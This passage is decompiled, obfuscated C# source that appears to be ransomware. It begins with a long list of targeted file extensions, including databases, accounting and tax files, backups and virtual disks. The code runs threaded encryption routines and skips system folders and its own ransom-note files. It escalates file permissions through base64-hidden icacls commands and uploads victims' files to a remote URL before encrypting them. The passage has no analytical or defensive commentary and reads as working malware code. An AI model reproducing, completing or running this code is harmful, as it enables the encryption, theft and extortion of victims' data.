				"nrs", "nrt", "nru", "nrw", "nrx", "ns2", "ns3", "ns4", "nsd", "nsg",
				"nsh", "nsq", "nsr", "nst", "nt", "ntf", "ntl", "ntp", "nts", "ntx",
				"NU2", "number", "numbers", "nupkg", "NUS", "NUSPEC", "nv", "nv2", "nvd", "nvdl",
				"nvl", "nvm", "nvram", "nwb", "nwbak", "nwcab", "nwcp", "nwdb", "nwelicense", "nwo",
				"nwp", "nws", "nx^d", "nx__", "nx1", "nx2", "nxl", "nyf", "oa2", "oa3",
				"oab", "oad", "oas", "obb", "OBD", "OBE", "obj", "obk", "obr", "obt",
				"obx", "obz", "occ", "ocdc", "ocimf", "ocs", "od", "oda", "odb", "odc",
				"odccubefile", "odf", "odg", "odh", "odi", "odif", "odm", "odo", "odp", "ods",
				"odt", "odt#", "odttf", "odx", "odz", "oeaccount", "oeb", "oem", "ofc", "officeui",
				"ofm", "ofn", "oft", "ofx", "oga", "ogc", "ogg", "oggu", "ogm", "ogmu",
				"ogs", "oil", "ojz", "okm", "old", "ole", "ole2", "olf", "olk", "olk14event",
				"olk14group", "olk14note", "olk14task", "oll", "olm", "olt", "olv", "oly", "omcs", "omg",
				"omlog", "omp", "onb", "ond", "one", "onepkg", "ont", "ontx", "oo3", "oos",
				"oot", "op", "op2", "op4", "opal", "opax", "opd", "opf", "opj", "opju",
				"oplx", "opn", "opt", "opx", "opxs", "oqy", "or2", "or3", "or4", "or5",
				"or6", "ora", "orf", "org", "ori", "orig", "ORP", "ort", "orx", "osd",
				"osdx", "ost", "osz", "ot", "otc", "otf", "otg", "oth", "oti", "otl",
				"otln", "otn", "otp", "ots", "ott", "otw", "otx", "out", "ova", "ovd",
				"ovf", "ovolog", "ovx", "owc", "owl", "owx", "oxps", "oxt", "oyx", "p01",
				"p10", "p12", "p2g", "p2i", "p2s", "p3", "p3x", "p65", "p7b", "p7c",
				"p7x", "p7z", "p96", "p97", "pab", "pack", "pad", "paf", "pages", "pages-tef",
				"pak", "pan", "paq", "partimg", "pas", "pat", "paux", "paw", "pbd", "pbf",
				"pbix", "pbj", "PBK", "pbp", "pbr", "pbs", "pbx5script", "pbxscript", "pc", "pcap",
				"pcapng", "pcb", "pcc", "pcd", "pcf", "pch", "pcj", "pck", "pcr", "PCS",
				"pct", "pcv", "pcw", "pd", "pd4", "pd5", "pdas", "pdb", "pdc", "pdcr",
				"pdd", "pdf", "pdf_", "pdf_profile", "pdf_tsid", "pdfa", "pdfe", "pdfenx", "pdfig", "pdfl",
				"pdfua", "pdfvt", "pdfx", "pdfxml", "pdfz", "pdg", "pdi", "pdm", "pdo", "pdp",
				"pds", "pdw", "pdx", "pdz", "peb", "pef", "pem", "pep", "PERF", "pes",
				"pex", "pez", "pf", "pfc", "pfd", "pfl", "pfm", "pfsx", "pft", "pfx",
				"pg", "pgd", "pgs", "phb", "phd", "phm", "php", "phr", "phs", "pih",
				"pixexp", "pj2", "pj4", "pj5", "pjm", "pjt", "pk", "pka", "pkb", "pkey",
				"pkg", "pkh", "pkpass", "pks", "pkt", "pl", "plan", "planner", "plb", "plc",
				"pld", "pli", "pln", "pls", "plt", "plus_muhd", "plw", "pm", "PM2", "pm3",
				"pm4", "pm5", "pm6", "pm7", "pmatrix", "pmd", "pmf", "pml", "pmm", "pmo",
				"pmr", "pmt", "pmv", "pmx", "pnproj", "pns", "pnu", "pnz", "po", "POC",
				"pod", "poi", "pool", "popshape", "por", "pot", "pothtml", "potm", "potx", "pp",
				"pp2", "pp3", "ppam", "ppd", "ppdf", "ppf", "ppj", "ppp", "ppr", "pps",
				"ppsenx", "ppsm", "ppsx", "ppt", "ppte", "ppthtml", "pptl", "pptm", "pptmhtml", "pptt",
				"pptx", "ppws", "ppx", "prc", "prd", "prdx", "pref", "prel", "prf", "printcd2",
				"prj", "prn", "pro", "pro4", "pro4dvd", "pro4pl", "pro4plx", "pro4x", "pro5", "pro5dvd",
				"pro5pl", "pro5plx", "pro5x", "pro6plx", "proofingtool", "props", "proqc", "prproj", "prr", "prs",
				"prt", "prtc", "prv", "prx", "ps", "PS1XML", "ps2", "ps3", "psa", "psafe3",
				"psb", "psd", "PSD1", "pse8db", "psf", "psg", "psi2", "psip", "psk", "psm",
				"PSM1", "psmd", "pspd", "pspimage", "pss", "pst", "psv", "psw", "psw6", "pswx",
				"psz", "pt3", "pt6", "ptb", "ptc", "ptf", "pth", "ptk", "ptn", "ptn2",
				"pts", "ptx", "PTXML", "ptz", "pub", "pubf", "pubhtml", "pubmhtml", "pubx", "puz",
				"pvd", "pve", "pvf", "pvhd", "pvm", "pvw", "pw", "pwd", "pwe", "pwf",
				"pwi", "pwm", "pwp", "pwre", "pxd", "pxf", "pxi", "pxj", "pxl", "pxp",
				"py", "pys", "pzc", "pzf", "pzt", "q07", "q08", "q09", "q3d", "qb",
				"qb2005", "qb2006", "qb2007", "qb2009", "qb2010", "qb2011", "qb2012", "qb2013", "qb2014", "qb2015",
				"qb2016", "qb2017", "qba", "qbatlg", "qbb", "qbj", "qbk", "qbl", "qbm", "qbmb",
				"qbmd", "qbr", "qbw", "qbx", "qbxml", "qby", "qch", "qcow", "qcow2", "qct",
				"qdat", "qdb", "qdf", "qdf-backup", "qdfm", "qdfx", "qdp", "qdt", "qed", "qel",
				"qf", "qfilter", "qfl", "qfx", "qfxx", "qhp", "qht", "qhtm", "qic", "qif",
				"qlgenerator", "qm", "qmbl", "qmtf", "qpb", "qpf", "qph", "qpx", "qrc", "qrmx",
				"qrp", "qrt", "qry", "qs", "qsd", "qsf", "qt", "qtq", "qtr", "qtw",
				"QUE", "quiz", "quox", "qv~", "qvd", "qvf", "qvp", "qvw", "qwd", "qwt",
				"qxb", "qxd", "qxf", "qxl", "qxp", "qxt", "r00", "r01", "r02", "r03",
				"r0f", "r0z", "r3d", "ra", "ra2", "raf", "ral", "ram", "ramd", "rap",
				"rar", "RAT", "ratdvd", "raw", "ray", "razy", "rb", "rbc", "rbf", "rbk",
				"rbs", "rbt", "rcb", "rcc", "rcd", "rcg", "rcl", "rctd", "rcx", "rd",
				"rd1", "rda", "rdata", "rdb", "rdf", "rdfs", "rdg", "rdi", "RDLC", "rdlx",
				"rdo", "rdoc", "rdoc_options", "rdx", "rdz", "re4", "reb", "rec", "redif", "ref",
				"reference", "rel", "rels", "rep", "res", "resbuild", "RESJSON", "rest", "result", "RESW",
				"ret", "rev", "rez", "rf", "rf1", "rfa", "rfo", "rft", "rge", "rgmb",
				"rgmc", "rgn", "rgo", "rgss3a", "rha", "rhif", "rhistory", "rim", "rit", "rl",
				"rlf", "rll", "rm", "rm5", "rmbak", "rmd", "rmf", "rmh", "rmuf", "rmx",
				"rna", "rng", "rnq", "rnt", "rnw", "ro3", "roadtrip", "roca", "rod", "rodx",
				"rodz", "rofl", "rog", "roi", "ROM", "ros", "rou", "rov", "row", "rox",
				"roxio", "roz", "rp", "rpa", "rpd", "rpf", "RPO", "rpp", "rpprj", "rpres",
				"rpt", "rptr", "rpyb", "rrd", "rrpa", "rrr", "rrt", "rrx", "rs", "rsc",
				"rsd", "rsdf", "rsdoc", "rsf", "rsm", "rso", "rsp", "rsrc", "rst", "rsv",
				"rsw", "rt", "rt_", "rta", "rtdf", "rte", "rtf", "rtf_", "rtfd", "rtk",
				"rtp", "rtpi", "rts", "rtsl", "rtstn", "rtsx", "rtttl", "rtwsh", "rtx", "ruel",
				"rum", "run", "rupaf", "rv", "rvf", "rvl", "rvt", "rw2", "rwd", "rwg",
				"rwl", "rwlibrary", "rws", "rwz", "rxdoc", "rzk", "rzx", "s3db", "s85", "s8bn",
				"sa5", "sa7", "sa8", "saas", "sad", "saf", "safe", "safetext", "sah", "sam",
				"sar", "sas7bdat", "sav", "save", "say", "sb", "sbc", "sbd", "sbf", "sbn",
				"sbo", "sbpf", "sbs", "sbsc", "sbst", "sbu", "sbw", "sbx", "sc2save", "sc4",
				"sc45", "sca", "scd", "scdoc", "sce", "scf", "scg", "scgc", "scgp", "scgs",
				"sch", "SCHEMA", "scm", "scmt", "scn", "sco", "scr", "scriv", "scrivx", "scs",
				"scspack", "scssc", "sct", "scw", "scx", "scz", "sd", "sd0", "sd1", "sda",
				"sdb", "sdc", "sdd", "sddraft", "sdi", "sdl", "sdlxliff", "sdmdocument", "sdn", "sdo",
				"sdoc", "sdp", "sdr", "sds", "sdsk", "sdt", "sdv", "sdw", "sdz", "se1",
				"SEARCH-MS", "secure", "seed", "sef", "sel", "sen", "seo", "seq", "sequ", "server",
				"ses", "set", "setup", "sev", "sfd", "sff", "sfs", "sfx", "sgf", "sgi",
				"sgl", "sgm", "sgml", "sgz", "sh", "sh6", "shar", "shb", "show", "SHP",
				"shr", "shs", "shtml", "shw", "shx", "shy", "sic", "sid", "sidd", "sidn",
				"sidx", "sie", "sig", "sik", "sim", "sis", "skb", "skv", "skx", "sky",
				"sla", "sldm", "sldtm", "sldx", "sle", "slf", "slk", "SLL", "slm", "slp",
				"slt", "slx", "slz", "sm", "smc", "smd", "sme", "smf", "smh", "smi",
				"smlx", "smn", "smp", "smpkg", "sms", "smwt", "smx", "smz", "sn1", "sn2",
				"sna", "snag", "snapshot", "snb", "snf", "sng", "snk", "snp", "sns", "snt",
				"snx", "so", "soi", "sp", "spb", "spd", "spdf", "speccy", "spf", "spg",
				"spj", "spk", "spl", "spm", "spml", "sppt", "spq", "spr", "sprt", "sprz",
				"sps", "spt", "spub", "spv", "sq", "sqb", "sqd", "sqf", "sqfs", "sql",
				"sqlite", "sqlite3", "sqlitedb", "sqllite", "sqr", "sqx", "sr2", "src", "SRD", "SRD-SHM",
				"SRD-WAL", "srf", "srfl", "srr", "srs", "srt", "srw", "ssa", "ssc", "ssd",
				"ssh", "ssi", "ssiw", "ssm", "ssp", "ssv", "ssx", "st", "st4", "st5",
				"st6", "st7", "st8", "sta", "stc", "std", "stdl", "STF", "stg", "sti",
				"stk", "stl", "stm", "STORE", "stp", "stproj", "stpz", "str", "struct", "stt",
				"stu", "stw", "stx", "stxt", "sty", "styk", "stykz", "sub", "sud", "suf",
				"sum", "surf", "sv$", "sv2i", "svd", "svdl", "svf", "svg", "svi", "svm",
				"svn", "svp", "svr", "svs", "swd", "swdoc", "sweb", "swf", "SWIDTAG", "switch",
				"swk", "swp", "sx", "sxc", "sxd", "sxe", "sxg", "sxi", "sxl", "sxm",
				"sxml", "sxw", "syn", "syncdb", "t", "t01", "t02", "t03", "t04", "t05",
				"t06", "t07", "t08", "t09", "t10", "t11", "t12", "t13", "t14", "t15",
				"t16", "t17", "t18", "t2", "t2k", "t2ks", "t2kt", "t2t", "t4g", "t64",
				"t80", "ta1", "ta2", "ta4", "ta5", "ta6", "ta7", "ta8", "ta9", "tab",
				"tabula-doc", "tabula-docstyle", "tac", "tag", "tah", "tao", "tap", "tar", "tardist", "TARGETS",
				"tax", "tax08", "tax09", "tax10", "tax11", "tax12", "tax13", "tax15", "tax16", "tax17",
				"tax2008", "tax2009", "tax2010", "tax2011", "tax2012", "tax2013", "tax2014", "tax2015", "tax2016", "tax2017",
				"tax2018", "tax2019", "tb", "tbb", "tbd", "tbh", "tbk", "tbkx", "tbl", "tbx",
				"tbz2", "tc", "tcc", "tcd", "tch", "tck", "tclogs", "tcnet", "tcx", "td0",
				"tda", "TDAT", "tdb", "tde", "tdg", "tdl", "tdm", "tdms", "tdoc", "tdr",
				"tdt", "te", "te1", "te3", "teacher", "ted", "tef", "template", "temx", "ter",
				"terrn", "terrn2", "tet", "tex", "texi", "texinfo", "text", "textclipping", "textile", "tfa",
				"tfd", "tfm", "tfr", "tfrd", "tg", "tga", "tgc", "tgd", "tgf", "tgz",
				"THA", "thm", "thml", "thmx", "thr", "tib", "tibkp", "tie", "tif", "tiff",
				"tig", "time", "timeline", "tis", "tjp", "tk3", "tkfl", "tl5", "tlb", "tld",
				"tlg", "tlp", "tlt", "tlx", "tlz", "tm", "tm3", "tmb", "tmd", "TME",
				"tml", "tmlanguage", "tmp", "tmr", "tmv", "tmw", "tmx", "tmz", "tmzip", "tns",
				"tnsp", "toast", "toc", "TON", "top", "topc", "topx", "tor", "torrent", "totalsdb",
				"totalslayout", "tp", "tpb", "tpd", "tpf", "tpl", "tpo", "tps", "tpsdb", "tpu",
				"tpx", "tqs", "tra", "trashinfo", "trc", "trd", "TRE", "trf", "trif", "trk",
				"trm", "trn", "trp", "trs", "trx", "ts", "tsc", "tsk", "tsl", "tsr",
				"tst", "tsv", "tt10", "tt11", "tt12", "tt13", "tt14", "tt15", "tt16", "tt17",
				"tt18", "tt2", "ttax", "ttbk", "ttd", "ttk", "ttmd", "TTS", "ttskey", "ttxt",
				"tu", "tur", "tvc", "tvd", "tvdownload", "twb", "twbx", "twdi", "twdx", "twh",
				"twm", "tww", "twz", "twzip", "tx", "txa", "txd", "txe", "txf", "txm",
				"txn", "txtrpt", "tyimport", "tyset", "tzx", "u10", "u11", "u12", "u3d", "uax",
				"ubj", "ubox", "ubz", "uccapilog", "ucd", "uci", "ud", "udb", "udc", "udeb",
				"udf", "udl", "uds", "UDT", "uea", "ufs", "uhtml", "uibak", "uif", "ukr",
				"ulf", "uli", "ulp", "ulys", "ulz", "umf", "ump", "umx", "UNINSTALL", "unity3d",
				"unr", "UNT", "unx", "uof", "uop", "uos", "uot", "update", "updf", "upk",
				"upoi", "upp", "upr", "urd-journal", "urf", "url", "urp", "usa", "useq", "usr",
				"ustar", "usx", "ut2", "ut3", "utc", "utd", "ute", "utf8", "uti", "utm",
				"uts", "utx", "uu", "uud", "uue", "uvf", "uvw", "uvx", "uwl", "uwrf",
				"uxx", "v", "v12", "v2i", "v2t", "val", "vaporcd", "vault", "vbadoc", "vbd",
				"vbk", "vbm", "vbox", "vbox-prev", "vbpf1", "vbs", "vbw", "VBX", "vc", "vc4",
				"vc6", "vc8", "vcal", "vcd", "vce", "vcf", "VCH", "vco", "vcp", "vcrd",
				"vcs", "vct", "vcx", "vdb", "vdf", "vdi", "vdo", "vdoc", "vdt", "vdx",
				"vec", "VER", "vf", "vfd", "vff", "vfs", "vfs0", "vhd", "vhdx", "vi",
				"vibe", "view", "vip", "vis", "viz", "vlc", "vle", "vlg", "vlt", "vmbx",
				"vmdk", "vmf", "vmg", "vmm", "vmsd", "vmsn", "vmss", "vmt", "vmwarevm", "vmx",
				"vmxf", "vob", "voi", "vok", "volarchive", "voprefs", "vor", "vp", "vpcbackup", "vpd",
				"vpk", "vpl", "vpol", "vpp", "vpp_pc", "vpx", "vrb", "vrd", "VRG", "vrp",
				"vs", "vsch", "vscontent", "vsd", "VSDIR", "vsdx", "vsf", "vsi", "vspolicy", "vssm",
				"vssx", "vst", "vstx", "vsv", "vsx", "vtf", "vthought", "vtv", "vtx", "vud",
				"vvf", "vvv", "vw", "vw3", "vxml", "vym", "vzm", "w", "w01", "w02",
				"W2B", "w2p", "w3g", "w3x", "w51", "w52", "w60", "w61", "w6bn", "w6w",
				"w8bn", "w8tn", "wab", "wac", "wad", "waff", "wallet", "walletx", "war", "wav",
				"wave", "waw", "wb", "wb1", "wb2", "wb3", "wbb", "wbcat", "WBF", "wbi",
				"wbk", "wbt", "wbxml", "wbz", "wcat", "wcd", "wcf", "wcl", "wcn", "wcp",
				"wcst", "wd0", "wd1", "wd2", "wd3", "wdb", "wdbn", "wdf", "wdgt", "wdl",
				"wdn", "wdoc", "wdq", "wdx9", "wea", "web", "webapp", "webdoc", "webpart", "wep",
				"WER", "wflx", "wfm", "wgt", "whf", "wht", "wid", "WIH", "wii", "wil",
				"wim", "win", "winclone", "wiz", "wjf", "wjr", "wk!", "wk1", "wk2", "wk3",
				"wk4", "wk5", "wkb", "wke", "wki", "wkl", "wks", "wlb", "wld", "wll",
				"wls", "wlx", "wlxml", "wlz", "wm", "wma", "wmd", "wmdb", "wmf", "wmga",
				"wmk", "wml", "wmlc", "wmmp", "wmo", "wms", "wmt", "wmv", "wmx", "wn",
				"wnk", "wolf", "word", "wordlist", "world", "wotreplay", "wow", "woz", "wp", "wp42",
				"wp5", "wp50", "wp6", "wp7", "wpa", "wpb", "wpc", "wpc2", "wpd", "wpd0",
				"wpd1", "wpd2", "wpd3", "wpe", "wpf", "wpk", "wpl", "wpo", "wpost", "wps",
				"wpt", "wpw", "wr1", "wrf", "wri", "wrk", "wrlk", "ws", "ws1", "ws2",
				"ws3", "ws4", "ws5", "ws6", "ws7", "WSB", "WSC", "wsd", "wsf", "wsh",
				"wsi", "wsm", "wsp", "wspak", "wtb", "wtbn", "wtd", "wtf", "wtml", "wtmp",
				"wtp", "wtr", "wts", "wtt", "wtx", "wud", "wvp", "wvw", "wvx", "wwcx",
				"WWD", "wwi", "wwl", "wws", "wwt", "wx", "wxmx", "wxp", "wyn", "wzn",
				"wzs", "x11", "x16", "x3f", "x3g", "x64", "xa", "xaf", "xaiml", "XAML",
				"xamlx", "xappl", "xar", "xas", "xav", "xbc", "xbd", "XBF", "xbk", "xbrl",
				"xbt", "xci", "xcsl", "xda", "xdb", "xdc", "xdf", "xdi", "xdna", "xdo",
				"xdoc", "xdp", "xds", "xdw", "xef", "xem", "xer", "xf", "xfd", "xfdf",
				"xfi", "xfl", "xflow", "xfn", "xfo", "xfp", "xfr", "xft", "xfx", "xgml",
				"xgmml", "xgp", "xht", "xhtm", "xhtml", "xif", "xig", "XIN", "xis", "xjf",
				"xl", "xla", "xlam", "xlb", "xlc", "xld", "xle", "xlf", "xlgc", "xliff",
				"xline", "xlist", "xlk", "xll", "xlm", "xlnk", "xlr", "xls", "xlsb", "xlse",
				"xlshtml", "xlsl", "xlsm", "xlst", "xlsx", "xlsxl", "xlt", "xlthtml", "xltm", "xltx",
				"xlv", "xlw", "xlwx", "xma", "xmap", "xmcd", "xmct", "xmd", "xmdf", "xmf",
				"xmi", "xmind", "xml", "xmlff", "xmlper", "xmmap", "xmn", "xmp", "xmpz", "xms",
				"xmt_bin", "xmta", "xmwx", "xmzx", "XPB", "xpd", "xpdl", "xpg", "xpi", "xpj",
				"xpll", "xpm", "xpr", "xps", "xpse", "xpt", "xpwe", "xqm", "xqr", "xqx",
				"xrb", "xrdml", "xrff", "xrp", "xry", "xsc", "xsd", "xsf", "xsig", "xsl",
				"xslt", "xsvf", "XSX", "xtbl", "xtd", "xtg", "xtm", "xtml", "xtp", "xtps",
				"xtrl", "xum", "xv0", "xv2", "xv3", "xva", "xvct", "xvd", "xvg", "xvid",
				"xvl", "xwd", "xweb3htm", "xweb3html", "xweb4stm", "xweb4xml", "xwf", "xwp", "xxd", "xxe",
				"xxx", "xy", "xy3", "xy4v", "xyd", "xyz", "xyzv", "yab", "yam", "ycbcra",
				"ychat", "yenc", "YES", "ygf", "yka", "yml", "ync", "yps", "yrcbck", "yrcbkm",
				"yrcdat", "yumtx", "yuv", "z02", "z04", "zap", "zbfx", "zdb", "zdc", "zdct",
				"ZFSENDTOTARGET", "zim", "zip", "zipx", "zix", "zma", "zmc", "zoo", "zpl", "zps",
				"ztmp", "ert", "efd", "biz", "CDX", "SQL", "DD", "MD", "MDF", "LOG",
				"DB", "BD", "LOG", "cfu", "DAT", "DBF", "DBX", "SDF", "BACK", "BACKUP",
				"BAC", "AWB", "DMP", "SAV", "TIB", "VBK", "VRB", "WBB", "TRN", "TIS",
				"ZIP", "RAR", "SQL", "BAK", "DCX", "DBC", "DBX", "DCT", "XLS", "XLSX",
				"DOC", "DOCX", "FPT", "LDF", "NDF", "$ER", "4DD", "4DL", "ACCDB", "ACCDC",
				"ACCDE", "ACCDR", "ACCDT", "ACCFT", "ADB", "ADB", "ADE", "ADF", "ADP", "ALF",
				"ASK", "BTR", "CAT", "CDB", "CDB", "CDB", "CKP", "CMA", "CPD", "CRYPT12",
				"CRYPT8", "CRYPT9", "DACPAC", "DAD", "DADIAGRAMS", "DASCHEMA", "DB", "DB", "DB-SHM", "DB-WAL",
				"DBCRYPT12", "DBCRYPT8", "DB3", "DBC", "DBF", "DBS", "DBT", "DBV", "DBX", "DCB",
				"DCT", "DCX", "DDL", "DLIS", "DP1", "DQY", "DSK", "DSN", "DTSX", "DXL",
				"ECO", "ECX", "EDB", "EDB", "EPIM", "EXB", "FCD", "FDB", "FDB", "FIC",
				"FMP", "FMP12", "FMPSL", "FOL", "FP3", "FP4", "FP5", "FP7", "FPT", "FRM",
				"GDB", "GDB", "GRDB", "GWI", "HDB", "HIS", "IB", "IDB", "IHX", "ITDB",
				"ITW", "JET", "JTX", "KDB", "KEXI", "KEXIC", "KEXIS", "LGC", "LWX", "MAF",
				"MAQ", "MAR", "MARSHAL", "MAS", "MAV", "MDB", "MDF", "MPD", "MRG", "MUD",
				"MWB", "MYD", "NDF", "NNT", "NRMLIB", "NS2", "NS3", "NS4", "NSF", "NV",
				"NV2", "NWDB", "NYF", "ODB", "ODB", "OQY", "ORA", "ORX", "OWC", "P96",
				"P97", "PAN", "PDB", "PDB", "PDM", "PNZ", "QRY", "QVD", "RBF", "RCTD",
				"ROD", "ROD", "RODX", "RPD", "RSD", "SAS7BDAT", "SBF", "SCX", "SDB", "SDB",
				"SDB", "SDB", "SDC", "SDF", "SIS", "SPQ", "SQL", "SQLITE", "SQLITE3", "SQLITEDB",
				"TE", "TEACHER", "TEMX", "TMD", "TPS", "TRC", "TRC", "TRM", "UDB", "UDL",
				"USR", "V12", "VIS", "VPD", "VVV", "WDB", "WMDB", "WRK", "XDB", "XLD",
				"XMLFF", "vmrs", "VMSC", "VMRS", "3me", "3pe", "hif", "iif", "lyt", "nd",
				"qb2005", "qb2006", "qb2007", "qb2009", "qb2010", "qbb", "qbm", "qbmb", "qbo", "qbw",
				"qbx", "qdf", "qel", "qfx", "qpb", "qsd", "tax", "tax08", "tax09", "tax10",
				"tax11", "tax2008", "tax2009", "tax2010", "tax2011", "tlg", "tt11", "qb2011", "qb2012", "imt",
				"3ME", "3PE", "HIF", "IIF", "LYT", "ND", "QB2005", "QB2006", "QB2007", "QB2009",
				"QB2010", "QBB", "QBM", "QBMB", "QBO", "QBW", "QBX", "QDF", "QEL", "QFX",
				"QPB", "QSD", "TAX", "TAX08", "TAX09", "TAX10", "TAX11", "TAX2008", "TAX2009", "TAX2010",
				"TAX2011", "TLG", "TT11", "QB2011", "QB2012", "IMT", "VHDX", "VHD", "lxa", "LXA",
				"AVHD", "AVHDX", "OVA"
			}, ".ltnuhr", new string[0], FdUEgPawbnib);
		}
	}

	[CompilerGenerated]
	private sealed class FacPBplpsEQBn
	{
		private sealed class GStiSkNcEWLW
		{
			public FacPBplpsEQBn MOUqIEmmmvrwLiN;

			public string YlyECGbeSKTtt;

			public void _003CCrypt_003Eb__2a()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					fCSCcBCUuOhJFjJ(WindowsIdentity.GetCurrent().Name, YlyECGbeSKTtt);
				}
			}

			public void _003CCrypt_003Eb__2b()
			{
				AIWAphzHta(YlyECGbeSKTtt, MOUqIEmmmvrwLiN.UGUJQtIciqfknNq, MOUqIEmmmvrwLiN.EGoUraLojisHp, MOUqIEmmmvrwLiN.aUECsTwpcdWe, MOUqIEmmmvrwLiN.oimBReKCiroR);
			}
		}

		public string[] UGUJQtIciqfknNq;

		public string[] aUECsTwpcdWe;

		public string oimBReKCiroR;

		public string EGoUraLojisHp;

		public void _003CCrypt_003Eb__29(string t)
		{
			if (FQIijKxWNIGko && !jxLIBcytJQJnAi().Contains("XP") && !jxLIBcytJQJnAi().Contains("Windows 7"))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						fCSCcBCUuOhJFjJ(WindowsIdentity.GetCurrent().Name, t);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (YCgDOWQTASnYBU == "YES")
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					AIWAphzHta(t, UGUJQtIciqfknNq, EGoUraLojisHp, aUECsTwpcdWe, oimBReKCiroR);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				AIWAphzHta(t, UGUJQtIciqfknNq, EGoUraLojisHp, aUECsTwpcdWe, oimBReKCiroR);
			}
		}
	}

	[CompilerGenerated]
	private sealed class jXQUlcPupWbk
	{
		private sealed class xBsSSLhRmerAmfx
		{
			public jXQUlcPupWbk cLxXGAOWmdGD;

			public string tlHeygDZtEO;

			public void _003CWorkerCrypter2_003Eb__38()
			{
				foreach (string item in sSiWAwlCjtk)
				{
					if (tlHeygDZtEO.ToLower().EndsWith(item + cLxXGAOWmdGD.JqtDPljnKzmIvrJL) && LmSFIAUjDvp == "YES")
					{
						if (Convert.ToInt32(zlQvQSTQrWnJ) * 1024 * 1024 > new FileInfo(tlHeygDZtEO).Length)
						{
							try
							{
								hmdnzLvPRv.btIFxWPjUxqW("URL", "USERNAME", "ACCESO", tlHeygDZtEO);
							}
							catch
							{
							}
						}
					}
					else if (tlHeygDZtEO.ToLower().EndsWith(item) && LmSFIAUjDvp == "NO")
					{
						try
						{
							hmdnzLvPRv.btIFxWPjUxqW("URL", "USERNAME", "ACCESO", tlHeygDZtEO);
						}
						catch
						{
						}
					}
				}
			}
		}

		private sealed class GlMrKHjNdiNyW
		{
			public jXQUlcPupWbk cLxXGAOWmdGD;

			public string BOPbSQLgaHnsb;

			public void _003CWorkerCrypter2_003Eb__3a()
			{
				foreach (string item in sSiWAwlCjtk)
				{
					if (BOPbSQLgaHnsb.ToLower().EndsWith(item + cLxXGAOWmdGD.JqtDPljnKzmIvrJL) && LmSFIAUjDvp == "YES")
					{
						if (Convert.ToInt32(zlQvQSTQrWnJ) * 1024 * 1024 > new FileInfo(BOPbSQLgaHnsb).Length)
						{
							try
							{
								hmdnzLvPRv.btIFxWPjUxqW("URL", "USERNAME", "ACCESO", BOPbSQLgaHnsb);
							}
							catch
							{
							}
						}
					}
					else if (BOPbSQLgaHnsb.ToLower().EndsWith(item) && LmSFIAUjDvp == "NO")
					{
						try
						{
							hmdnzLvPRv.btIFxWPjUxqW("URL", "USERNAME", "ACCESO", BOPbSQLgaHnsb);
						}
						catch
						{
						}
					}
				}
			}
		}

		public List<string> NANSUGkiblrGd;

		public List<string> ZAEYxHlJQkzsPJo;

		public string JqtDPljnKzmIvrJL;

		public string[] VBXQSFABSmoC;

		public string FdUEgPawbnib;

		public void _003CWorkerCrypter2_003Eb__37(string t1)
		{
			string tlHeygDZtEO;
			foreach (string item in ZAEYxHlJQkzsPJo)
			{
				if (item.Contains("C:\\Program Files\\") || item.Contains("C:\\Program Files (x86)\\") || item.Contains(":\\Windows\\") || item.ToLower().Contains("perflogs") || item.ToLower().Contains("internet explorer") || item.Contains(":\\ProgramData\\") || item.Contains("\\AppData\\") || item.ToLower().Contains("msocache") || item.ToLower().Contains("system volume information") || item.ToLower().Contains("boot") || item.ToLower().Contains("tor browser") || item.ToLower().Contains("mozilla") || item.ToLower().Contains("google chrome") || item.ToLower().Contains("application data") || item.Contains("autoexec.bat") || item.Contains("desktop.ini") || item.Contains("autorun.inf") || item.Contains("ntuser.dat") || item.Contains("NTUSER.DAT") || item.Contains("iconcache.db") || item.Contains("bootsect.bak") || item.Contains("boot.ini") || item.Contains("ntuser.dat.log") || item.Contains("thumbs.db") || item.ToLower().Contains("bootmgr") || item.ToLower().Contains("pagefile.sys") || item.ToLower().Contains("config.sys") || item.ToLower().Contains("ntuser.ini") || item.Contains(agZtqMkMayfivgE("QnVpbGRlcl9Mb2c=")) || item.Contains("RSAKeys") || item.Contains("Config.enc") || item.Contains("RESTORE_FILES_INFO") || item.EndsWith(JqtDPljnKzmIvrJL) || item.EndsWith("exe") || item.EndsWith("dll") || item.EndsWith("EXE") || item.EndsWith("DLL") || item.Contains("Recycle.Bin") || item.Contains(ZJFGqhHHen) || item.Contains(SlCyjezmzcjRF) || item.Contains(uLoFxWVggAfF))
				{
					continue;
				}
				if (VBXQSFABSmoC.Length != 0)
				{
					string[] vBXQSFABSmoC = VBXQSFABSmoC;
					int num = 0;
					while (num < vBXQSFABSmoC.Length)
					{
						string value = vBXQSFABSmoC[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0b81;
					}
				}
				try
				{
					if (item.EndsWith(JqtDPljnKzmIvrJL))
					{
						goto IL_0b81;
					}
				}
				catch (Exception)
				{
					goto IL_0b81;
				}
				if (!item.EndsWith(t1) || HUJfkxnbjYLg.Contains(item))
				{
					continue;
				}
				if (NfVMPYnMMJ == "YES")
				{
					try
					{
						if (jARNwzUwUMTWq.KioEuDUzlDg(item))
						{
							jARNwzUwUMTWq.TLMMbRBqrsEJER(item);
						}
					}
					catch
					{
					}
				}
				HUJfkxnbjYLg.Add(item);
				if (!mmgceOUJLT.Contains(Path.GetDirectoryName(item)))
				{
					mmgceOUJLT.Add(Path.GetDirectoryName(item));
				}
				BDUUIKslMbszMvU(item);
				try
				{
					new iPIBmSPcKTz().fgMMWLFsoedzr(item);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (hzzRDIjGDyq)
							{
								Console.WriteLine("Setting write access permission: " + item + " - File Size: " + new FileInfo(item).Length + " bytes");
								Console.WriteLine("----------------------------------------------------------------------------");
							}
						}
						catch
						{
						}
						bhxKBVXCniiAP(agZtqMkMayfivgE("aWNhY2xzLmV4ZQ=="), "\"" + item + "\"" + agZtqMkMayfivgE("IC9ncmFudCA=") + "\"" + Environment.UserName + "\"" + agZtqMkMayfivgE("OkYgL1QgL0MgL1E="));
					}
				}
				catch (Exception ex2)
